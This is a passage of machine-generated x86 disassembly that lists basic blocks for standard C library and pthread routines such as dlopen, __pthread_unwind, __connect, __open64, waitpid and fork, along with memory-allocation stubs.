0x90013e6:	test	eax, eax
0x90013e8:	mov	esi, eax
0x90013ea:	je	0x9001411
None
|
|
|
v
0x900135d:	mov	dword ptr [esp + 4], edi
0x9001361:	mov	edi, dword ptr [ebp - 0x1c]
0x9001364:	lea	edx, dword ptr [esi + 0x10]
0x9001367:	lea	ecx, dword ptr [esi + 8]
0x900136a:	lea	eax, dword ptr [esi + 0xc]
0x900136d:	mov	dword ptr [esp], edi
0x9001370:	mov	edi, dword ptr [ebx - 0x1c]
0x9001376:	call	dword ptr [edi + 0x1a8]
None
|
|
|
v
0x9001300:	push	ebp
0x9001301:	mov	ebp, esp
0x9001303:	push	edi
0x9001304:	mov	edi, edx
0x9001306:	push	esi
0x9001307:	push	ebx
0x9001308:	call	0x9000b00
None
|
|
|
v
0x90013c8:	test	eax, eax
0x90013ca:	mov	esi, eax
0x90013cc:	jne	0x9001349
None
|
|
|
v
0x9001356:	mov	dword ptr [esi + 0x10], 0
0x900135d:	mov	dword ptr [esp + 4], edi
0x9001361:	mov	edi, dword ptr [ebp - 0x1c]
0x9001364:	lea	edx, dword ptr [esi + 0x10]
0x9001367:	lea	ecx, dword ptr [esi + 8]
0x900136a:	lea	eax, dword ptr [esi + 0xc]
0x900136d:	mov	dword ptr [esp], edi
0x9001370:	mov	edi, dword ptr [ebx - 0x1c]
0x9001376:	call	dword ptr [edi + 0x1a8]
None
|
|
|
v
0x90013a0:	mov	dword ptr [esp], eax
0x90013a3:	call	0x90009f0
None
|
|
|
v
0x90013d2:	mov	dword ptr [esp + 4], 0x14
0x90013da:	mov	dword ptr [esp], 1
0x90013e1:	call	0x9000ac0
None
|
|
|
v
0x900133f:	mov	esi, dword ptr [ebx + 0x60]
0x9001345:	test	esi, esi
0x9001347:	je	0x90013b0
None
|
|
|
v
0x9001349:	mov	eax, dword ptr [esi + 0x10]
0x900134c:	test	eax, eax
0x900134e:	je	0x900135d
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:dlopen
TOTAL BLOCKS :7
0x900194c:	test	eax, eax
0x900194e:	mov	eax, esi
0x9001950:	cmove	eax, dword ptr [esp + 0x18]
0x9001955:	add	esp, 0x24
0x9001958:	pop	ebx
0x9001959:	pop	esi
0x900195a:	ret	
None
|
|
|
v
0x9001900:	push	esi
0x9001901:	push	ebx
0x9001902:	sub	esp, 0x24
0x9001905:	mov	edx, dword ptr [esp + 0x34]
0x9001909:	call	0x9000b00
None
|
|
|
v
0x900190e:	add	ebx, 0x26f2
0x9001914:	mov	eax, dword ptr [esp + 0x30]
0x9001918:	mov	ecx, dword ptr [esp + 0x2c]
0x900191c:	mov	esi, edx
0x900191e:	or	esi, 1
0x9001921:	test	dl, 3
0x9001924:	cmove	edx, esi
0x9001927:	mov	esi, dword ptr [ebx + 0x54]
0x900192d:	mov	dword ptr [esp + 0x10], eax
0x9001931:	mov	dword ptr [esp + 0x1c], ecx
0x9001935:	mov	dword ptr [esp + 0x14], edx
0x9001939:	test	esi, esi
0x900193b:	jne	0x900195b
None
|
|
|
v
0x900195b:	mov	esi, dword ptr [esi]
0x900195d:	mov	dword ptr [esp + 8], ecx
0x9001961:	mov	dword ptr [esp + 4], edx
0x9001965:	mov	dword ptr [esp], eax
0x9001968:	call	esi
None
|
|
|
v
0x9001955:	add	esp, 0x24
0x9001958:	pop	ebx
0x9001959:	pop	esi
0x900195a:	ret	
None
|
|
|
v
0x900193d:	lea	edx, dword ptr [esp + 0x10]
0x9001941:	lea	eax, dword ptr [ebx - 0x27b0]
0x9001947:	call	0x9001300
None
|
|
|
v
0x900196a:	jmp	0x9001955
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__libc_fatal
TOTAL BLOCKS :1
0xa0043e0:	jmp	dword ptr [ebx + 0x28]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__libc_fork
TOTAL BLOCKS :1
0xa004500:	jmp	dword ptr [ebx + 0x70]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__libc_dlopen_mode
TOTAL BLOCKS :1
0xa0045f0:	jmp	dword ptr [ebx + 0xac]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__libc_dlsym
TOTAL BLOCKS :1
0xa004680:	jmp	dword ptr [ebx + 0xd0]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:abort
TOTAL BLOCKS :1
0xa004790:	jmp	dword ptr [ebx + 0x114]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__libc_longjmp
TOTAL BLOCKS :1
0xa0047d0:	jmp	dword ptr [ebx + 0x124]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__x86.get_pc_thunk.bx
TOTAL BLOCKS :1
0xa005680:	mov	ebx, dword ptr [esp]
0xa005683:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__x86.get_pc_thunk.cx
TOTAL BLOCKS :1
0xa005da9:	mov	ecx, dword ptr [esp]
0xa005dac:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__pthread_unwind
TOTAL BLOCKS :14
0xa00d831:	jmp	0xa00d878
None
|
|
|
v
0xa00d771:	add	ebx, 0xb88f
0xa00d777:	mov	esi, dword ptr gs:[8]
0xa00d77e:	mov	dword ptr gs:[0x250], eax
0xa00d784:	mov	dword ptr gs:[0x254], edx
0xa00d78b:	lea	eax, dword ptr [ebx - 0xba00]
0xa00d791:	mov	dword ptr gs:[0x258], eax
0xa00d797:	lea	eax, dword ptr [ebx - 0xb9c0]
0xa00d79d:	add	esi, 0x250
0xa00d7a3:	mov	dword ptr [esp + 8], edi
0xa00d7a7:	mov	dword ptr [esp + 4], eax
0xa00d7ab:	mov	dword ptr [esp], esi
0xa00d7ae:	call	0xa00fb40
None
|
|
|
v
0xa00d7b8:	nop	
0xa00d7b9:	lea	esi, dword ptr [esi]
0xa00d7c0:	sub	esp, 0xc
0xa00d7c3:	mov	eax, dword ptr [eax + 0x1c]
0xa00d7c6:	call	0xa00d760
None
|
|
|
v
0xa00d84d:	mov	edx, esi
0xa00d84f:	mov	eax, dword ptr [ebp + 0x10]
0xa00d852:	sub	edx, edi
0xa00d854:	ror	eax, 9
0xa00d857:	xor	eax, dword ptr gs:[0x18]
0xa00d85e:	sub	eax, edi
0xa00d860:	cmp	edx, eax
0xa00d862:	jb	0xa00d838
None
|
|
|
v
0xa00d846:	mov	esi, dword ptr [esi + 0xc]
0xa00d849:	test	esi, esi
0xa00d84b:	je	0xa00d878
None
|
|
|
v
0xa00d7dd:	add	ebx, 0xb823
0xa00d7e3:	mov	dword ptr [esp + 4], eax
0xa00d7e7:	mov	eax, dword ptr [esp + 0x20]
0xa00d7eb:	mov	dword ptr [esp], eax
0xa00d7ee:	call	0xa0047d0
None
|
|
|
v
0xa00d838:	cmp	dword ptr [esp + 0xc], edx
0xa00d83c:	jae	0xa00d878
None
|
|
|
v
0xa00d864:	mov	dword ptr gs:[0x7c], esi
0xa00d86b:	add	esp, 0x10
0xa00d86e:	pop	esi
0xa00d86f:	pop	edi
0xa00d870:	pop	ebp
0xa00d871:	ret	
None
|
|
|
v
0xa00d7b3:	call	0xa004790
None
|
|
|
v
0xa00d760:	push	edi
0xa00d761:	xor	edx, edx
0xa00d763:	push	esi
0xa00d764:	mov	edi, eax
0xa00d766:	push	ebx
0xa00d767:	xor	eax, eax
0xa00d769:	sub	esp, 0x10
0xa00d76c:	call	0xa005680
None
|
|
|
v
0xa00d83e:	mov	eax, dword ptr [esi + 4]
0xa00d841:	mov	dword ptr [esp], eax
0xa00d844:	call	dword ptr [esi]
None
|
|
|
v
0xa00d7cb:	nop	
0xa00d7cd:	nop	
0xa00d7cf:	nop	
0xa00d7d0:	push	ebx
0xa00d7d1:	sub	esp, 0x18
0xa00d7d4:	mov	eax, dword ptr [esp + 0x24]
0xa00d7d8:	call	0xa005680
None
|
|
|
v
0xa00d878:	xor	esi, esi
0xa00d87a:	jmp	0xa00d864
None
|
|
|
v
0xa00d7f3:	nop	
0xa00d7f5:	nop	
0xa00d7f7:	nop	
0xa00d7f9:	nop	
0xa00d7fb:	nop	
0xa00d7fd:	nop	
0xa00d7ff:	nop	
0xa00d800:	push	ebp
0xa00d801:	push	edi
0xa00d802:	push	esi
0xa00d803:	sub	esp, 0x10
0xa00d806:	mov	eax, dword ptr gs:[8]
0xa00d80c:	mov	edi, dword ptr [eax + 0x270]
0xa00d812:	add	edi, dword ptr [eax + 0x274]
0xa00d818:	mov	eax, dword ptr [esp + 0x24]
0xa00d81c:	mov	ebp, dword ptr [esp + 0x20]
0xa00d820:	sub	eax, edi
0xa00d822:	mov	dword ptr [esp + 0xc], eax
0xa00d826:	mov	esi, dword ptr gs:[0x7c]
0xa00d82d:	test	esi, esi
0xa00d82f:	jne	0xa00d84d
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__pthread_enable_asynccancel
TOTAL BLOCKS :10
0xa00d8a7:	mov	eax, edx
0xa00d8a9:	ret	
None
|
|
|
v
0xa00d89f:	and	ecx, 0xffffffbb
0xa00d8a2:	cmp	ecx, 0xa
0xa00d8a5:	je	0xa00d8ae
None
|
|
|
v
0xa00d8aa:	mov	edx, eax
0xa00d8ac:	jmp	0xa00d887
None
|
|
|
v
0xa00d8c5:	mov	eax, dword ptr gs:[0x80]
0xa00d8cb:	nop	
0xa00d8cc:	lea	esi, dword ptr [esi]
0xa00d8d0:	call	0xa00d760
None
|
|
|
v
0xa00d8bc:	lock or	dword ptr gs:[0x84], 0x10
None
|
|
|
v
0xa00d880:	mov	edx, dword ptr gs:[0x84]
0xa00d887:	mov	ecx, edx
0xa00d889:	or	ecx, 2
0xa00d88c:	cmp	ecx, edx
0xa00d88e:	je	0xa00d8a7
None
|
|
|
v
0xa00d890:	mov	eax, edx
0xa00d892:	lock cmpxchg	dword ptr gs:[0x84], ecx
0xa00d89b:	cmp	edx, eax
0xa00d89d:	jne	0xa00d8aa
None
|
|
|
v
0xa00d8d5:	lea	esi, dword ptr [esi]
0xa00d8d9:	lea	edi, dword ptr [edi]
None
|
|
|
v
0xa00d8ae:	sub	esp, 0xc
0xa00d8b1:	mov	dword ptr gs:[0x228], 0xffffffff
0xa00d8bc:	lock or	dword ptr gs:[0x84], 0x10
None
|
|
|
v
0xa00d887:	mov	ecx, edx
0xa00d889:	or	ecx, 2
0xa00d88c:	cmp	ecx, edx
0xa00d88e:	je	0xa00d8a7
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__pthread_disable_asynccancel
TOTAL BLOCKS :11
0xa00d911:	pop	esi
0xa00d912:	pop	edi
0xa00d913:	pop	ebp
0xa00d914:	ret	
None
|
|
|
v
0xa00d8f5:	mov	edx, ecx
0xa00d8f7:	mov	eax, ecx
0xa00d8f9:	and	edx, 0xfffffffd
0xa00d8fc:	lock cmpxchg	dword ptr gs:[0x84], edx
0xa00d905:	cmp	ecx, eax
0xa00d907:	jne	0xa00d916
None
|
|
|
v
0xa00d91a:	lea	edi, dword ptr [esi + 0x84]
0xa00d920:	mov	ebp, 0xf0
0xa00d925:	mov	eax, ebp
0xa00d927:	mov	ecx, 0x80
0xa00d92c:	xor	esi, esi
0xa00d92e:	xchg	ebx, edi
0xa00d930:	int	0x80
None
|
|
|
v
0xa00d8e4:	push	ebp
0xa00d8e5:	push	edi
0xa00d8e6:	push	esi
0xa00d8e7:	mov	esi, dword ptr gs:[8]
0xa00d8ee:	mov	ecx, dword ptr gs:[0x84]
0xa00d8f5:	mov	edx, ecx
0xa00d8f7:	mov	eax, ecx
0xa00d8f9:	and	edx, 0xfffffffd
0xa00d8fc:	lock cmpxchg	dword ptr gs:[0x84], edx
0xa00d905:	cmp	ecx, eax
0xa00d907:	jne	0xa00d916
None
|
|
|
v
0xa00d914:	ret	
None
|
|
|
v
0xa00d909:	and	ecx, 0xc
0xa00d90c:	cmp	ecx, 4
0xa00d90f:	je	0xa00d91a
None
|
|
|
v
0xa00d925:	mov	eax, ebp
0xa00d927:	mov	ecx, 0x80
0xa00d92c:	xor	esi, esi
0xa00d92e:	xchg	ebx, edi
0xa00d930:	int	0x80
None
|
|
|
v
0xa00d916:	mov	ecx, eax
0xa00d918:	jmp	0xa00d8f5
None
|
|
|
v
0xa00d932:	xchg	ebx, edi
0xa00d934:	mov	edx, dword ptr gs:[0x84]
0xa00d93b:	mov	eax, edx
0xa00d93d:	and	eax, 0xc
0xa00d940:	cmp	eax, 4
0xa00d943:	jne	0xa00d911
None
|
|
|
v
0xa00d8e0:	test	al, 2
0xa00d8e2:	jne	0xa00d914
None
|
|
|
v
0xa00d945:	jmp	0xa00d925
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__fcntl
TOTAL BLOCKS :14
0xa00df33:	mov	dword ptr [esp + 0xc], edx
0xa00df37:	call	0xa00d880
None
|
|
|
v
0xa00df6a:	mov	eax, edi
0xa00df6c:	jmp	0xa00df1e
None
|
|
|
v
0xa00df6e:	mov	edx, dword ptr [ebx - 0x2c]
0xa00df74:	neg	eax
0xa00df76:	mov	ecx, dword ptr gs:[0]
0xa00df7d:	mov	dword ptr [ecx + edx], eax
0xa00df80:	or	eax, 0xffffffff
0xa00df83:	jmp	0xa00df1e
None
|
|
|
v
0xa00df2c:	cmp	dword ptr [esp + 0x24], 7
0xa00df31:	jne	0xa00deff
None
|
|
|
v
0xa00df25:	cmp	dword ptr [esp + 0x24], 0xe
0xa00df2a:	je	0xa00df33
None
|
|
|
v
0xa00deff:	mov	edi, dword ptr [esp + 0x20]
0xa00df03:	mov	ecx, dword ptr [esp + 0x24]
0xa00df07:	xchg	edi, ebx
0xa00df09:	mov	eax, 0xdd
0xa00df0e:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xa00df15:	xchg	ebx, edi
0xa00df17:	cmp	eax, 0xfffff000
0xa00df1c:	ja	0xa00df6e
None
|
|
|
v
0xa00dee0:	push	edi
0xa00dee1:	push	esi
0xa00dee2:	push	ebx
0xa00dee3:	sub	esp, 0x10
0xa00dee6:	call	0xa005680
None
|
|
|
v
0xa00deeb:	add	ebx, 0xb115
0xa00def1:	mov	edx, dword ptr [esp + 0x28]
0xa00def5:	mov	eax, dword ptr gs:[0xc]
0xa00defb:	test	eax, eax
0xa00defd:	jne	0xa00df25
None
|
|
|
v
0xa00df63:	mov	eax, esi
0xa00df65:	call	0xa00d8e0
None
|
|
|
v
0xa00df58:	xchg	ebx, edi
0xa00df5a:	cmp	eax, 0xfffff000
0xa00df5f:	mov	edi, eax
0xa00df61:	ja	0xa00df85
None
|
|
|
v
0xa00df85:	mov	eax, dword ptr [ebx - 0x2c]
0xa00df8b:	neg	edi
0xa00df8d:	mov	ecx, dword ptr gs:[0]
0xa00df94:	mov	dword ptr [ecx + eax], edi
0xa00df97:	or	edi, 0xffffffff
0xa00df9a:	jmp	0xa00df63
None
|
|
|
v
0xa00df1e:	add	esp, 0x10
0xa00df21:	pop	ebx
0xa00df22:	pop	esi
0xa00df23:	pop	edi
0xa00df24:	ret	
None
|
|
|
v
0xa00df3c:	mov	edi, dword ptr [esp + 0x20]
0xa00df40:	mov	ecx, dword ptr [esp + 0x24]
0xa00df44:	mov	edx, dword ptr [esp + 0xc]
0xa00df48:	mov	esi, eax
0xa00df4a:	xchg	edi, ebx
0xa00df4c:	mov	eax, 0xdd
0xa00df51:	call	dword ptr gs:[0x10]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__connect
TOTAL BLOCKS :11
0xa00e07e:	add	ecx, 0xaf82
0xa00e084:	mov	ecx, dword ptr [ecx - 0x2c]
0xa00e08a:	neg	eax
0xa00e08c:	add	ecx, dword ptr gs:[0]
0xa00e093:	mov	dword ptr [ecx], eax
0xa00e095:	or	eax, 0xffffffff
0xa00e098:	ret	
None
|
|
|
v
0xa00e04f:	mov	esi, eax
0xa00e051:	mov	edx, ebx
0xa00e053:	mov	eax, 0x66
0xa00e058:	mov	ebx, 3
0xa00e05d:	lea	ecx, dword ptr [esp + 8]
0xa00e061:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xa00e048:	ret	
None
|
|
|
v
0xa00e079:	call	0xa005da9
None
|
|
|
v
0xa00e070:	mov	eax, esi
0xa00e072:	pop	esi
0xa00e073:	cmp	eax, 0x83
0xa00e076:	jae	0xa00e079
None
|
|
|
v
0xa00e078:	ret	
None
|
|
|
v
0xa00e068:	mov	ebx, edx
0xa00e06a:	xchg	eax, esi
0xa00e06b:	call	0xa00d8e0
None
|
|
|
v
0xa00e020:	cmp	dword ptr gs:[0xc], 0
0xa00e028:	jne	0xa00e049
None
|
|
|
v
0xa00e041:	mov	ebx, edx
0xa00e043:	cmp	eax, 0x83
0xa00e046:	jae	0xa00e079
None
|
|
|
v
0xa00e02a:	mov	edx, ebx
0xa00e02c:	mov	eax, 0x66
0xa00e031:	mov	ebx, 3
0xa00e036:	lea	ecx, dword ptr [esp + 4]
0xa00e03a:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xa00e049:	push	esi
0xa00e04a:	call	0xa00d880
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__open64
TOTAL BLOCKS :12
0xa00e6c6:	mov	dword ptr [esp + 0xc], edx
0xa00e6ca:	call	0xa00d880
None
|
|
|
v
0xa00e6bf:	add	esp, 0x10
0xa00e6c2:	pop	ebx
0xa00e6c3:	pop	esi
0xa00e6c4:	pop	edi
0xa00e6c5:	ret	
None
|
|
|
v
0xa00e719:	mov	edx, eax
0xa00e71b:	mov	ecx, dword ptr gs:[0]
0xa00e722:	or	edi, 0xffffffff
0xa00e725:	mov	eax, dword ptr [ebx - 0x2c]
0xa00e72b:	neg	edx
0xa00e72d:	mov	dword ptr [ecx + eax], edx
0xa00e730:	jmp	0xa00e6f7
None
|
|
|
v
0xa00e684:	add	ebx, 0xa97c
0xa00e68a:	test	edi, 0x40
0xa00e690:	cmovne	edx, dword ptr [esp + 0x28]
0xa00e695:	mov	eax, dword ptr gs:[0xc]
0xa00e69b:	test	eax, eax
0xa00e69d:	jne	0xa00e6c6
None
|
|
|
v
0xa00e702:	mov	edx, dword ptr [ebx - 0x2c]
0xa00e708:	neg	eax
0xa00e70a:	mov	ecx, dword ptr gs:[0]
0xa00e711:	mov	dword ptr [ecx + edx], eax
0xa00e714:	or	eax, 0xffffffff
0xa00e717:	jmp	0xa00e6bf
None
|
|
|
v
0xa00e6b6:	xchg	ebx, edi
0xa00e6b8:	cmp	eax, 0xfffff000
0xa00e6bd:	ja	0xa00e702
None
|
|
|
v
0xa00e6cf:	mov	ecx, edi
0xa00e6d1:	mov	edx, dword ptr [esp + 0xc]
0xa00e6d5:	or	ch, 0x80
0xa00e6d8:	mov	edi, dword ptr [esp + 0x20]
0xa00e6dc:	mov	esi, eax
0xa00e6de:	xchg	edi, ebx
0xa00e6e0:	mov	eax, 5
0xa00e6e5:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xa00e69f:	mov	ecx, edi
0xa00e6a1:	mov	edi, dword ptr [esp + 0x20]
0xa00e6a5:	or	ch, 0x80
0xa00e6a8:	xchg	edi, ebx
0xa00e6aa:	mov	eax, 5
0xa00e6af:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xa00e6ec:	xchg	ebx, edi
0xa00e6ee:	cmp	eax, 0xfffff000
0xa00e6f3:	mov	edi, eax
0xa00e6f5:	ja	0xa00e719
None
|
|
|
v
0xa00e670:	push	edi
0xa00e671:	mov	edx, 0
0xa00e676:	push	esi
0xa00e677:	push	ebx
0xa00e678:	sub	esp, 0x10
0xa00e67b:	mov	edi, dword ptr [esp + 0x24]
0xa00e67f:	call	0xa005680
None
|
|
|
v
0xa00e6fe:	mov	eax, edi
0xa00e700:	jmp	0xa00e6bf
None
|
|
|
v
0xa00e6f7:	mov	eax, esi
0xa00e6f9:	call	0xa00d8e0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:waitpid
TOTAL BLOCKS :13
0xa00ec7c:	call	0xa00d880
None
|
|
|
v
0xa00ec73:	pop	ebx
0xa00ec74:	cmp	eax, 0xfffff001
0xa00ec79:	jae	0xa00ecad
None
|
|
|
v
0xa00ec7b:	ret	
None
|
|
|
v
0xa00ecac:	ret	
None
|
|
|
v
0xa00ec50:	cmp	dword ptr gs:[0xc], 0
0xa00ec58:	jne	0xa00ec7c
None
|
|
|
v
0xa00eca4:	pop	eax
0xa00eca5:	cmp	eax, 0xfffff001
0xa00ecaa:	jae	0xa00ecad
None
|
|
|
v
0xa00ec81:	push	eax
0xa00ec82:	push	ebx
0xa00ec83:	mov	edx, dword ptr [esp + 0x14]
0xa00ec87:	mov	ecx, dword ptr [esp + 0x10]
0xa00ec8b:	mov	ebx, dword ptr [esp + 0xc]
0xa00ec8f:	mov	eax, 7
0xa00ec94:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xa00ec9f:	call	0xa00d8e0
None
|
|
|
v
0xa00ecb2:	add	ecx, 0xa34e
0xa00ecb8:	mov	ecx, dword ptr [ecx - 0x2c]
0xa00ecbe:	neg	eax
0xa00ecc0:	add	ecx, dword ptr gs:[0]
0xa00ecc7:	mov	dword ptr [ecx], eax
0xa00ecc9:	or	eax, 0xffffffff
0xa00eccc:	ret	
None
|
|
|
v
0xa00ecad:	call	0xa005da9
None
|
|
|
v
0xa00ec9c:	xchg	dword ptr [esp], eax
None
|
|
|
v
0xa00ec9b:	pop	ebx
0xa00ec9c:	xchg	dword ptr [esp], eax
None
|
|
|
v
0xa00ec5a:	push	ebx
0xa00ec5b:	mov	edx, dword ptr [esp + 0x10]
0xa00ec5f:	mov	ecx, dword ptr [esp + 0xc]
0xa00ec63:	mov	ebx, dword ptr [esp + 8]
0xa00ec67:	mov	eax, 7
0xa00ec6c:	call	dword ptr gs:[0x10]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:pthread_cancel_init
TOTAL BLOCKS :21
0xa00fa86:	add	ebx, 0x957a
0xa00fa8c:	sub	esp, 0x18
0xa00fa8f:	mov	eax, dword ptr [ebx + 0x21e8]
0xa00fa95:	test	eax, eax
0xa00fa97:	je	0xa00fab7
None
|
|
|
v
0xa00fa67:	lea	eax, dword ptr [ebx - 0x701c]
0xa00fa6d:	mov	dword ptr [esp], eax
0xa00fa70:	call	0xa0043e0
None
|
|
|
v
0xa00f9c6:	test	eax, eax
0xa00f9c8:	mov	ebp, eax
0xa00f9ca:	je	0xa00fa67
None
|
|
|
v
0xa00f994:	lea	eax, dword ptr [ebx - 0x7075]
0xa00f99a:	mov	dword ptr [esp + 4], 0x80000001
0xa00f9a2:	mov	dword ptr [esp], eax
0xa00f9a5:	call	0xa0045f0
None
|
|
|
v
0xa00f9aa:	test	eax, eax
0xa00f9ac:	mov	esi, eax
0xa00f9ae:	je	0xa00fa67
None
|
|
|
v
0xa00f970:	push	ebp
0xa00f971:	push	edi
0xa00f972:	push	esi
0xa00f973:	push	ebx
0xa00f974:	call	0xa005680
None
|
|
|
v
0xa00fab2:	add	esp, 0x18
0xa00fab5:	pop	ebx
0xa00fab6:	ret	
None
|
|
|
v
0xa00f979:	add	ebx, 0x9687
0xa00f97f:	sub	esp, 0x1c
0xa00f982:	mov	eax, dword ptr [ebx + 0x21e8]
0xa00f988:	test	eax, eax
0xa00f98a:	je	0xa00f994
None
|
|
|
v
0xa00fab7:	call	0xa00f970
None
|
|
|
v
0xa00fa99:	mov	edx, dword ptr [esp + 0x20]
0xa00fa9d:	mov	eax, dword ptr [ebx + 0x21e4]
0xa00faa3:	ror	eax, 9
0xa00faa6:	xor	eax, dword ptr gs:[0x18]
0xa00faad:	mov	dword ptr [esp], edx
0xa00fab0:	call	eax
None
|
|
|
v
0xa00fa18:	xor	ebp, dword ptr gs:[0x18]
0xa00fa1f:	rol	ebp, 9
0xa00fa22:	xor	edi, dword ptr gs:[0x18]
0xa00fa29:	rol	edi, 9
0xa00fa2c:	mov	edx, dword ptr [esp + 0xc]
0xa00fa30:	xor	eax, dword ptr gs:[0x18]
0xa00fa37:	rol	eax, 9
0xa00fa3a:	xor	edx, dword ptr gs:[0x18]
0xa00fa41:	rol	edx, 9
0xa00fa44:	mov	dword ptr [ebx + 0x21e4], ebp
0xa00fa4a:	mov	dword ptr [ebx + 0x21e0], edi
0xa00fa50:	mov	dword ptr [ebx + 0x21dc], edx
0xa00fa56:	mov	dword ptr [ebx + 0x21d8], eax
0xa00fa5c:	mov	dword ptr [ebx + 0x21e8], esi
0xa00fa62:	jmp	0xa00f98c
None
|
|
|
v
0xa00fabc:	lea	esi, dword ptr [esi]
0xa00fac0:	jmp	0xa00fa99
None
|
|
|
v
0xa00f9fa:	test	eax, eax
0xa00f9fc:	mov	dword ptr [esp + 0xc], eax
0xa00fa00:	je	0xa00fa67
None
|
|
|
v
0xa00f9e2:	test	eax, eax
0xa00f9e4:	mov	edi, eax
0xa00f9e6:	je	0xa00fa67
None
|
|
|
v
0xa00fa02:	lea	eax, dword ptr [ebx - 0x702e]
0xa00fa08:	mov	dword ptr [esp + 4], eax
0xa00fa0c:	mov	dword ptr [esp], esi
0xa00fa0f:	call	0xa004680
None
|
|
|
v
0xa00f9e8:	lea	eax, dword ptr [ebx - 0x7043]
0xa00f9ee:	mov	dword ptr [esp + 4], eax
0xa00f9f2:	mov	dword ptr [esp], esi
0xa00f9f5:	call	0xa004680
None
|
|
|
v
0xa00fa75:	lea	esi, dword ptr [esi]
0xa00fa79:	lea	edi, dword ptr [edi]
0xa00fa80:	push	ebx
0xa00fa81:	call	0xa005680
None
|
|
|
v
0xa00f9b4:	lea	eax, dword ptr [ebx - 0x7067]
0xa00f9ba:	mov	dword ptr [esp + 4], eax
0xa00f9be:	mov	dword ptr [esp], esi
0xa00f9c1:	call	0xa004680
None
|
|
|
v
0xa00fa14:	test	eax, eax
0xa00fa16:	je	0xa00fa67
None
|
|
|
v
0xa00f9d0:	lea	eax, dword ptr [ebx - 0x7058]
0xa00f9d6:	mov	dword ptr [esp + 4], eax
0xa00f9da:	mov	dword ptr [esp], esi
0xa00f9dd:	call	0xa004680
None
|
|
|
v
0xa00f98c:	add	esp, 0x1c
0xa00f98f:	pop	ebx
0xa00f990:	pop	esi
0xa00f991:	pop	edi
0xa00f992:	pop	ebp
0xa00f993:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_Unwind_ForcedUnwind
TOTAL BLOCKS :6
0xa00fb46:	add	ebx, 0x94ba
0xa00fb4c:	sub	esp, 0x18
0xa00fb4f:	mov	eax, dword ptr [ebx + 0x21e8]
0xa00fb55:	test	eax, eax
0xa00fb57:	je	0xa00fb87
None
|
|
|
v
0xa00fb8c:	lea	esi, dword ptr [esi]
0xa00fb90:	jmp	0xa00fb59
None
|
|
|
v
0xa00fb40:	push	ebx
0xa00fb41:	call	0xa005680
None
|
|
|
v
0xa00fb87:	call	0xa00f970
None
|
|
|
v
0xa00fb82:	add	esp, 0x18
0xa00fb85:	pop	ebx
0xa00fb86:	ret	
None
|
|
|
v
0xa00fb59:	mov	edx, dword ptr [esp + 0x28]
0xa00fb5d:	mov	eax, dword ptr [ebx + 0x21dc]
0xa00fb63:	ror	eax, 9
0xa00fb66:	xor	eax, dword ptr gs:[0x18]
0xa00fb6d:	mov	dword ptr [esp + 8], edx
0xa00fb71:	mov	edx, dword ptr [esp + 0x24]
0xa00fb75:	mov	dword ptr [esp + 4], edx
0xa00fb79:	mov	edx, dword ptr [esp + 0x20]
0xa00fb7d:	mov	dword ptr [esp], edx
0xa00fb80:	call	eax
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:fork
TOTAL BLOCKS :3
0xa010e94:	add	esp, 8
0xa010e97:	pop	ebx
0xa010e98:	ret	
None
|
|
|
v
0xa010e80:	push	ebx
0xa010e81:	call	0xa005680
None
|
|
|
v
0xa010e86:	add	ebx, 0x817a
0xa010e8c:	sub	esp, 8
0xa010e8f:	call	0xa004500
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:realloc
TOTAL BLOCKS :1
0xb0173e0:	jmp	dword ptr [ebx + 0x10]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:malloc
TOTAL BLOCKS :1
0xb0173f0:	jmp	dword ptr [ebx + 0x14]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b017400
TOTAL BLOCKS :1
0xb017400:	jmp	dword ptr [ebx + 0x18]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b017430
TOTAL BLOCKS :1
0xb017430:	jmp	dword ptr [ebx + 0x24]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_dl_find_dso_for_object
TOTAL BLOCKS :1
0xb017440:	jmp	dword ptr [ebx + 0x28]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:calloc
TOTAL BLOCKS :1
0xb017450:	jmp	dword ptr [ebx + 0x2c]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:free
TOTAL BLOCKS :1
0xb017470:	jmp	dword ptr [ebx + 0x34]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b017480
